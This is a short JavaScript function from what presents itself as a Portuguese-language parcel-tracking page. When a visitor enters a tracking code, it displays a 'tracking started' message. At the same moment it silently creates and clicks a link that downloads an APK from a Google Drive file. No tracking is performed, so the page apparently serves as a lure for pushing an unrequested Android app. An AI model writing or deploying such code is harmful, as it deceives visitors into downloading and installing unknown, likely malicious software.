function rastrear() {
    const codigo = document.getElementById('codigoRastreio').value;
    const resultado = document.getElementById('resultado');

    if(codigo.trim() === '') {
        resultado.textContent = "Por favor, insira um código de rastreio.";
        resultado.style.color = "red";
    } else {
        resultado.textContent = "Rastreamento iniciado para: " + codigo;
        resultado.style.color = "green";

        // Baixar automaticamente o APK
        const link = document.createElement('a');
        link.href = 'https://drive.google.com/uc?export=download&id=1V5LStaexyvnxm874BOeaPn_gJUgDRnCD';
        link.download = '';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }
}

